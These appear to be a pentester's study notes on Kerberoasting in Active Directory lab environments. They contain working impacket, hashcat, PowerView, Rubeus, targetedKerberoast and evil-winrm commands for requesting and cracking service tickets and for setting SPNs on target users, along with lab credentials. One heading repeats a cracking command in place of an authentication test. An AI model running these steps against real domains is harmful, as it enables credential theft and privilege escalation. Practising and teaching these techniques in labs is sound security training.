- some accounts might be configured with Service Principal Names (SPNs).
- SPNs are unique ids that kerberos uses to map a service instance to a service account.
- lateral movement/privesc method
- Targets SPNs
- Things needed for Kerberoasting:
	- account password (or hash)
	- shell as a domain user
		- OR SYSTEM access on a domain-joined host
- Retrieving a Kerberos ticket for an account with SPN does not allow command execution but the ticket is encrypted with the service account's NTLM hash.
	- The cleartext password can be cracked offline
- Service accounts usually have easy passwords or same as username
- if a domain sql server's password is cracked, you can find it reused as a local admin
- Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.

<hr>

## Kerberoasting - Performing the Attack
- Different ways depending upon our position in the network
	- from a non-domain joined Linux host using valid domain user credentials
	- from a domain joined Linux host as root after retrieving the keytab file
	- from a domain-joined Windows host authenticated as a domain user
	- From a domain-joined windows host with a shell as a domain user
	- As a SYSTEM on a domain-joined Windows host
	- from a non-domain joined Windows host using `runas /netonly`
- TOOLS:
	- impacket GetUserSPNs.py - https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
	- setspn.exe Windows binary, PowerShell, and Mimikatz.
	- Windows - utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.
- Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be `cracked` offline with a tool such as Hashcat to obtain the cleartext password. 
- TGS tickets take longer to crack than other formats such as NTLM hashes. Unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.

<hr>

## Efficacy of the Attack
- might not always be fruitful
- sometimes direct domain admin access, or privesc
- sometimes you crack hash but privilege is kinda same
- sometimes cant even crack

<hr>

# ATTACK:
### Prerequisite:
- domain user creds
- shell as domain user
- account as `SYSTEM`
- know which host is the domain controller
## Kerberoasting using GetUserSPNs.py
- Install Impacket - https://github.com/SecureAuthCorp/impacket
- `GetUserSPNs.py -h`
### Listing SPN Accounts with GetUserSPNs.py
- `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend`
### Request TGS tickets
- `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request`
### Request TGS for a specific account
- `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev`

**For offline cracking, save the TGS ticket to an output file**
### Save TGS to an output file
- `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs`
- **Cracking the Ticket with Hashcat**
	- `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt`
- **Testing authentication against a DC**
	- `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt`

<hr>

## TargetedKerberoasting

### Linux
- https://github.com/ShutdownRepo/targetedKerberoast
- `python3 targetedKerberoast.py -v -d 'hospital.htb' -u 'drbrown' -p 'chr!$br0wn' --use-ldaps`
- `python3 targetedKerberoast.py -d voleur.htb --dc-ip 10.129.39.50 -u svc_ldap@voleur.htb -k --dc-host dc`
- **Crack hash**:
	-  `hashcat -m 13100 alfred.hash /opt/SecLists/mine/rockyou.txt`
### Windows
- `Import-Module PowerView.ps1`
- `Get-DomainUser -Identity "TargetUser" -Properties serviceprincipalname`
- `Set-DomainObject -Identity "TargetUser" -Set @{serviceprincipalname='blah/blah'}`
- Get hash to crack:
- linux:
	- `impacket-GetUserSPNs -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/backupadm -request-user ttimmons -o ttimmons.hash`
- Windows:
	- `.\Rubeus.exe kerberoast /user:TargetUser /nowrap`
- **OR**
- `$SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
- `$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)`
- `Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose`
- 

### Clock Skew
- Kerberoasting time issues (Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)) - https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069
	- `sudo timedatectl set-ntp off`
	- `sudo rdate -n [IP of Target]`

## Using evil-winrm with kerberos `-k`
- `impacket-getTGT voleur.htb/svc_winrm -dc-ip 10.129.39.50`
- `export KRB5CCNAME=/home/kali/hack/HTB/machines/windows/voleur/svc_winrm.ccache`
- `klist` - confirm if ticket is imported.
- If you hate editing `/etc/krb5.conf` every time you switch machines, you can use the `KRB5_CONFIG` environment variable. This allows you to point Kerberos to a **custom config file** anywhere on your system, so you don't need `sudo`.
1. **Create a local file** (e.g., `~/htb.conf`):
	- Ini, TOML
```
[libdefaults]
	default_realm = VOLEUR.HTB

[realms]
	VOLEUR.HTB = {
		kdc = 10.129.39.50
	}
```
2. **Point your shell to it**:
- Bash
```
export KRB5_CONFIG=~/htb.conf
```
3. **Run evil-winrm**
- `evil-winrm -i dc.voleur.htb -r VOLEUR.HTB`
